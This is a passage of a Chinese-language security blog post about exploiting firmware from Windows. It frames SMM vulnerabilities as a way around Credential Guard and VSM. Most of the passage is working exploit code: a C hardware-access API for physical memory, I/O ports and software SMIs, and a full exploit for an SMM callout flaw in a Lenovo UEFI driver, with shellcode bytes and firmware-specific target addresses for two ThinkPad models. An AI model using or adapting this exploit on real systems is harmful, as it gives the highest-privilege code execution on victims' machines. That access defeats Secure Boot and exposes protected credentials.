<p>至此，终于清楚地找到了导致SW SMI handler 3错误的漏洞驱动程序。这次我还决定为该漏洞编写更多的利用程序，在Windows平台上利用本地应用程序或驱动程序，而不是使用其他第三方依赖库（如CHIPSEC）。</p>
<h1 id="Windows环境中的固件漏洞利用"><a href="#Windows环境中的固件漏洞利用" class="headerlink" title="Windows环境中的固件漏洞利用"></a>Windows环境中的固件漏洞利用</h1><p>在以前的文章中，我使用Python和CHIPSEC来编写利用脚本，对于验证PoC目的而言，它非常友好，但对于实际应用而言却并不方便。因此我决定开发自己的跨平台硬件抽象库，用C编写的程序来代替CHIPSEC。</p>
<p>另外，这次我选择Windows作为SMM驱动程序漏洞利用目标的原因有很多：</p>
<ul>
<li>预装有Windows的新PC可能会启用安全启动，导致任意执行SMM代码的漏洞还可以对存储安全启动配置的NVRAM区域进行任意r&#x2F;w访问。</li>
<li>微软的Windows 10企业版发布了一项名为 <a target="_blank" rel="noopener" href="https://technet.microsoft.com/en-us/library/mt483740(v=vs.85).aspx">Credential Guard</a>的新安全机制（默认情况下为禁用）,即使攻击者能够在目标操作系统上获取所有权限（ring3 + ring0代码执行），它也可以保护存储在内存中的域凭据。</li>
</ul>
<p>启用Credential Guard后，它会使用另一个新功能——Virtual Secure Mode (VSM)，关于其工作原理可以查看<a target="_blank" rel="noopener" href="https://twitter.com/aionescu">Alex Ionescu</a>的”Battle of SKM and IUM”（<a target="_blank" rel="noopener" href="http://www.alex-ionescu.com/blackhat2015.pdf">slides</a>, <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=LqaWIn4y26E">video</a>）</p>
<p>VSM是受保护的虚拟机（也称secure world），可在Hyper-V虚拟机管理程序上独立于主机Windows 10系统及其内核运行。在启用了Credential Guard的Local Security Subsystem Service (LSASS)系统上，VSM拥有自己的隔离内核模式和用户模式，该部分负责将凭据保存在内存中，并在VSM中作为隔离用户模式进程运行：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809163016403.png" alt="image-20230809163016403"></p>
<p>如你所见，Credential Guard可以<a target="_blank" rel="noopener" href="http://woshub.com/virtual-secure-mode-vsm-in-windows-10-enterprise/">防止</a><a target="_blank" rel="noopener" href="https://github.com/gentilkiwi/mimikatz">mimikatz</a>和类似的工具来转储用户凭据，但是，这仅是基于理想固件且没有SMM漏洞之类的安全问题的平台上。如英特尔研究人员在“<a target="_blank" rel="noopener" href="http://www.intelsecurity.com/advanced-threat-research/content/AttackingHypervisorsViaFirmware_bhusa15_dc23.pdf">Attacking Hypervisors via Firmware and Hardware</a>”中所说的那样，在Hyper-V的根分区（如主机）中运行任意代码的攻击者可以使用APMC I&#x2F;O端口B2h来触发SMI handler漏洞，该漏洞允许绕过由hypervisor提供支持的VSM隔离（实际上，SMM是IA-32最强大的执行模式，并且hypervisor也具有完全的物理内存空间访问权限）。</p>
<p>和Linux不同的是，在Windows操作系统上，没有任何可利用的机制允许从用户模式进程访问物理内存或I&#x2F;O端口，对低级硬件的访问必须加载内核驱动程序。另外，64位Windows内核使用<a target="_blank" rel="noopener" href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff548231(v=vs.85).aspx">Digital Signature Enforcement (DSE)</a>机制，要求所有的驱动程序代码必须有数字签名。</p>
<p>我的硬件访问runtime项目名为”fwexpl”。它由<a target="_blank" rel="noopener" href="https://github.com/Cr4sh/fwexpl/tree/master/src/driver">Windows内核驱动程序</a>和使用Win32函数<code>DeviceIoControl()</code>与驱动程序进行通信的<a target="_blank" rel="noopener" href="https://github.com/Cr4sh/fwexpl/tree/master/src/libfwexpl">用户模式库</a>组成。libfwexpl的<a target="_blank" rel="noopener" href="https://github.com/Cr4sh/fwexpl/blob/master/include/libfwexpl.h">顶级API</a>与操作系统无关，之后我打算将该库移植到Linux和OSX。下面是它的C头文件，提供对物理内存、I&#x2F;O端口、PCI配置空间的访问，和用于内存管理和SW SMI的多个函数：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// data width for uefi_expl_port_read/write and uefi_expl_pci_read/write</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">data_width</span> &#123;</span> U8, U16, U32, U64 &#125; data_width;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// PCI address from bus, device, function and offset for uefi_expl_pci_read/write</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PCI_ADDR(_bus_, _dev_, _func_, _addr_)                           \</span></span><br><span class="line"><span class="meta">                                                                         \</span></span><br><span class="line"><span class="meta">    (unsigned int)(((_bus_) &lt;&lt; 16) | ((_dev_) &lt;&lt; 11) | ((_func_) &lt;&lt; 8) | \</span></span><br><span class="line"><span class="meta">                   ((_addr_) &amp; 0xfc) | ((unsigned int)0x80000000))</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// initialize kernel driver</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">uefi_expl_init</span><span class="params">(<span class="type">char</span> *driver_path)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// unload kernel driver</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">uefi_expl_uninit</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// check if kernel driver is initialized</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">uefi_expl_is_initialized</span><span class="params">(<span class="type">void</span>)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// read physical memory at given address</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">uefi_expl_phys_mem_read</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> address, <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">char</span> *buff)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// write physical memory at given address</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">uefi_expl_phys_mem_write</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> address, <span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">char</span> *buff)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// read value from I/O port</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">uefi_expl_port_read</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port, data_width size, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *val)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// write value to I/O port</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">uefi_expl_port_write</span><span class="params">(<span class="type">unsigned</span> <span class="type">short</span> port, data_width size, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> val)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// read value from PCI config space of specified device</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">uefi_expl_pci_read</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> address, data_width size, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *val)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// write value to PCI config space of specified device</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">uefi_expl_pci_write</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> address, data_width size, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> val)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// generate software SMI using APMC I/O port 0xB2</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">uefi_expl_smi_invoke</span><span class="params">(<span class="type">unsigned</span> <span class="type">char</span> code)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// allocate contiguous physical memory</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">uefi_expl_mem_alloc</span><span class="params">(<span class="type">int</span> size, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *addr, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *phys_addr)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// free memory that was allocated with uefi_expl_mem_alloc()</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">uefi_expl_mem_free</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// convert virtual address to physical memory address</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">uefi_expl_phys_addr</span><span class="params">(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *phys_addr)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// get model specific register value</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">uefi_expl_msr_get</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> reg, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *val)</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// set model specific register value</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">uefi_expl_msr_set</span><span class="params">(<span class="type">unsigned</span> <span class="type">int</span> reg, <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> val)</span>;</span><br></pre></td></tr></table></figure>

<p>libfwxpl的<a target="_blank" rel="noopener" href="https://github.com/Cr4sh/fwexpl/blob/master/src/application/src/lenovo_SystemSmmAhciAspiLegacyRt.cpp">C代码</a>利用了<code>SystemSmmAhciAspiLegacyRt </code> UEFI驱动程序中的SMM callout漏洞：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UEFI_EXPL_TARGET</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">// Target address to overwrite (EFI_BOOT_SERVICES-&gt;LocateService field value)</span></span><br><span class="line">    <span class="comment">// with shellcode address.</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Number of vulnerable SMI handler.</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> smi_num;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// Target name and description.</span></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *name;</span><br><span class="line"> </span><br><span class="line">&#125; UEFI_EXPL_TARGET,</span><br><span class="line">*PUEFI_EXPL_TARGET;</span><br><span class="line"> </span><br><span class="line"><span class="comment">// list of model and firmware version specific constants for different targets</span></span><br><span class="line"><span class="type">static</span> UEFI_EXPL_TARGET g_targets[] =</span><br><span class="line">&#123;</span><br><span class="line">    &#123; <span class="number">0xd12493b0</span>, <span class="number">0x01</span>, <span class="string">&quot;Lenovo ThinkPad X230 firmware 2.61&quot;</span>  &#125;,</span><br><span class="line">    &#123; <span class="number">0xa11a6750</span>, <span class="number">0x03</span>, <span class="string">&quot;Lenovo ThinkPad T450s firmware 1.11&quot;</span> &#125;</span><br><span class="line">&#125;;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//  g_shellcode中handler和上下文值的偏移</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHELLCODE_OFFS_HANDLER 33</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SHELLCODE_OFFS_CONTEXT 23</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">// shellcode entry that executes smm_handler()</span></span><br><span class="line"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">char</span> g_shellcode[] =</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Save registers</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="number">0x53</span> <span class="comment">/* push rbx */</span>, <span class="number">0x51</span> <span class="comment">/* push rcx */</span>, <span class="number">0x52</span> <span class="comment">/* push rdx */</span>,</span><br><span class="line">    <span class="number">0x56</span> <span class="comment">/* push rsi */</span>, <span class="number">0x57</span> <span class="comment">/* push rdi */</span>,</span><br><span class="line">    <span class="number">0x41</span>, <span class="number">0x50</span> <span class="comment">/* push r8  */</span>, <span class="number">0x41</span>, <span class="number">0x51</span> <span class="comment">/* push r9  */</span>, <span class="number">0x41</span>, <span class="number">0x52</span> <span class="comment">/* push r10 */</span>,</span><br><span class="line">    <span class="number">0x41</span>, <span class="number">0x53</span> <span class="comment">/* push r11 */</span>, <span class="number">0x41</span>, <span class="number">0x54</span> <span class="comment">/* push r12 */</span>, <span class="number">0x41</span>, <span class="number">0x55</span> <span class="comment">/* push r13 */</span>,</span><br><span class="line">    <span class="number">0x41</span>, <span class="number">0x56</span> <span class="comment">/* push r14 */</span>, <span class="number">0x41</span>, <span class="number">0x57</span> <span class="comment">/* push r15 */</span>,</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Call smm_handler() function.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xb9</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// mov    rcx, context</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xb8</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>,  <span class="comment">// mov    rax, handler</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xec</span>, <span class="number">0x20</span>,                                      <span class="comment">// sub    rsp, 0x20</span></span><br><span class="line">    <span class="number">0xff</span>, <span class="number">0xd0</span>,                                                  <span class="comment">// call   rax</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x83</span>, <span class="number">0xc4</span>, <span class="number">0x20</span>,                                      <span class="comment">// add    rsp, 0x20</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Restore registers.</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="number">0x41</span>, <span class="number">0x5f</span> <span class="comment">/* pop r15 */</span>, <span class="number">0x41</span>, <span class="number">0x5e</span> <span class="comment">/* pop r14 */</span>, <span class="number">0x41</span>, <span class="number">0x5d</span> <span class="comment">/* pop r13 */</span>,</span><br><span class="line">    <span class="number">0x41</span>, <span class="number">0x5c</span> <span class="comment">/* pop r12 */</span>, <span class="number">0x41</span>, <span class="number">0x5b</span> <span class="comment">/* pop r11 */</span>, <span class="number">0x41</span>, <span class="number">0x5a</span> <span class="comment">/* pop r10 */</span>,</span><br><span class="line">    <span class="number">0x41</span>, <span class="number">0x59</span> <span class="comment">/* pop r9  */</span>, <span class="number">0x41</span>, <span class="number">0x58</span> <span class="comment">/* pop r8  */</span>,</span><br><span class="line">    <span class="number">0x5f</span> <span class="comment">/* pop rdi */</span>, <span class="number">0x5e</span> <span class="comment">/* pop rsi */</span>, <span class="number">0x5a</span> <span class="comment">/* pop rdx */</span>,</span><br><span class="line">    <span class="number">0x59</span> <span class="comment">/* pop rcx */</span>, <span class="number">0x5b</span> <span class="comment">/* pop rbx */</span>,</span><br><span class="line"> </span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">        Shellcode必须返回-1，以绕过sub_3DC() SMI处理程序内部的其他函数调用，</span></span><br><span class="line"><span class="comment">        防止SMM内部发生错误。</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0x31</span>, <span class="number">0xc0</span>,                                            <span class="comment">// xor    rax, rax</span></span><br><span class="line">    <span class="number">0x48</span>, <span class="number">0xff</span>, <span class="number">0xc8</span>,                                            <span class="comment">// dec    rax</span></span><br><span class="line">    <span class="number">0xc3</span>                                                         <span class="comment">// ret</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">smm_handler</span><span class="params">(PUEFI_EXPL_SMM_SHELLCODE_CONTEXT context)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// tell to the caller that smm_handler() was executed</span></span><br><span class="line">    context-&gt;smi_count += <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (context-&gt;user_handler)</span><br><span class="line">    &#123;</span><br><span class="line">        UEFI_EXPL_SMM_HANDLER user_handler = (UEFI_EXPL_SMM_HANDLER)context-&gt;user_handler;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// call external handler</span></span><br><span class="line">        user_handler((<span class="type">void</span> *)context-&gt;user_context);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//--------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="type">bool</span> <span class="title function_">expl_lenovo_SystemSmmAhciAspiLegacyRt</span><span class="params">(</span></span><br><span class="line"><span class="params">    <span class="type">int</span> target,</span></span><br><span class="line"><span class="params">    UEFI_EXPL_SMM_HANDLER handler, <span class="type">void</span> *context)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">bool</span> ret = <span class="literal">false</span>;</span><br><span class="line">    UEFI_EXPL_TARGET *expl_target = <span class="literal">NULL</span>;</span><br><span class="line">    UEFI_EXPL_SMM_SHELLCODE_CONTEXT smm_context;</span><br><span class="line"> </span><br><span class="line">    smm_context.smi_count = <span class="number">0</span>;</span><br><span class="line">    smm_context.user_handler = smm_context.user_context = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (target &lt; <span class="number">0</span> || target &gt;= <span class="keyword">sizeof</span>(g_targets) / <span class="keyword">sizeof</span>(UEFI_EXPL_TARGET))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// get target model information</span></span><br><span class="line">    expl_target = &amp;g_targets[target];</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(__FUNCTION__<span class="string">&quot;(): Using target \&quot;%s\&quot;\n&quot;</span>, expl_target-&gt;name);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (handler)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> addr = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)handler;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// call caller specified handler from SMM</span></span><br><span class="line">        <span class="keyword">if</span> (!uefi_expl_phys_addr(addr, &amp;smm_context.user_handler))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        smm_context.user_context = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)context;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> handler_addr = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)&amp;smm_handler, handler_phys_addr = <span class="number">0</span>;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> context_addr = (<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span>)&amp;smm_context, context_phys_addr = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// get physical address of smm_handler()</span></span><br><span class="line">    <span class="keyword">if</span> (!uefi_expl_phys_addr(handler_addr, &amp;handler_phys_addr))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// get physical address of smm_context</span></span><br><span class="line">    <span class="keyword">if</span> (!uefi_expl_phys_addr(context_addr, &amp;context_phys_addr))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(__FUNCTION__<span class="string">&quot;(): SMM payload handler address is 0x%llx with context at 0x%llx\n&quot;</span>,</span><br><span class="line">        handler_phys_addr, context_phys_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> sc_addr = <span class="number">0</span>, sc_phys_addr = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// allocate memory for shellcode</span></span><br><span class="line">    <span class="keyword">if</span> (!uefi_expl_mem_alloc(PAGE_SIZE, &amp;sc_addr, &amp;sc_phys_addr))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> shellcode[<span class="keyword">sizeof</span>(g_shellcode)];</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">memcpy</span>(shellcode, g_shellcode, <span class="keyword">sizeof</span>(g_shellcode));</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)&amp;shellcode[SHELLCODE_OFFS_HANDLER] = handler_phys_addr;</span><br><span class="line">    *(<span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> *)&amp;shellcode[SHELLCODE_OFFS_CONTEXT] = context_phys_addr;</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">printf</span>(__FUNCTION__<span class="string">&quot;(): Physical memory for shellcode allocated at 0x%llx\n&quot;</span>, sc_phys_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (uefi_expl_phys_mem_write(sc_phys_addr, <span class="keyword">sizeof</span>(shellcode), shellcode))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="type">unsigned</span> <span class="type">long</span> <span class="type">long</span> ptr_val = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// read original pointer value</span></span><br><span class="line">        <span class="keyword">if</span> (uefi_expl_phys_mem_read(</span><br><span class="line">               expl_target-&gt;addr, <span class="keyword">sizeof</span>(ptr_val), (<span class="type">unsigned</span> <span class="type">char</span> *)&amp;ptr_val))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">printf</span>(__FUNCTION__<span class="string">&quot;(): Old pointer 0x%llx value is 0x%llx\n&quot;</span>,</span><br><span class="line">                expl_target-&gt;addr, ptr_val);</span><br><span class="line"> </span><br><span class="line">            <span class="comment">// overwrite pointer value</span></span><br><span class="line">            <span class="keyword">if</span> (uefi_expl_phys_mem_write(</span><br><span class="line">                   expl_target-&gt;addr, <span class="keyword">sizeof</span>(sc_phys_addr), (<span class="type">unsigned</span> <span class="type">char</span> *)&amp;sc_phys_addr))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="built_in">printf</span>(__FUNCTION__<span class="string">&quot;(): Generating SMI %d...\n&quot;</span>, expl_target-&gt;smi_num);</span><br><span class="line"> </span><br><span class="line">                uefi_expl_smi_invoke(expl_target-&gt;smi_num);</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">if</span> (smm_context.smi_count &gt; <span class="number">0</span>)</span><br><span class="line">                &#123;</span><br><span class="line">                    ret = <span class="literal">true</span>;</span><br><span class="line">                &#125;</span><br><span class="line"> </span><br><span class="line">                <span class="built_in">printf</span>(__FUNCTION__<span class="string">&quot;(): %s\n&quot;</span>, ret ? <span class="string">&quot;SUCCESS&quot;</span> : <span class="string">&quot;FAILS&quot;</span>);</span><br><span class="line"> </span><br><span class="line">                <span class="comment">// restore overwritten value</span></span><br><span class="line">                uefi_expl_phys_mem_write(</span><br><span class="line">                    expl_target-&gt;addr, <span class="keyword">sizeof</span>(ptr_val), (<span class="type">unsigned</span> <span class="type">char</span> *)&amp;ptr_val);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="comment">// free memory</span></span><br><span class="line">    uefi_expl_mem_free(sc_addr);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

